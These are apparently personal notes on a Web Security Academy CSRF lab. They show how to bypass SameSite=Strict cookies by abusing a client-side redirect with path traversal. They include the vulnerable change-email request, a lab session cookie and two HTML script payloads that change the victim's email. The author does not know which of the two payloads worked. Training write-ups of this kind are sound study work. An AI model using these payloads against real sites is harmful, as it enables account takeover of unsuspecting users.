# CSRF Lab 8: SameSite Strict via Client-Side Redirect

## Notes
Session Cookie: TSEuNj6FHuUlKWJxJvD4blwiHJTQ42Xc

Login page shows SameSite=Strict

Email can be changed with a GET request

Copy the GET request:
    /my-account/change-email?email=email@email.com&submit=1
Change the & for the submit value to %26 for URL encoding

Testing CSRF Tokens Checklist: - CSRF Vulnerable
    - Relevant Actions - change email
    - Cookie based session handling - session cookie
    - No unpredictlbe request parameter - passes

## Exploit
```html
<script>
    document.location = "https://0a3c004b03d1da9f81d6486800f60039.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";
</script>
```
```html
<script>
    window.location = "https://0a3c004b03d1da9f81d6486800f60039.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=evil%40ludicro.net%26submit=1";
</script>
```

One of these scripts worked and I don't remember which one.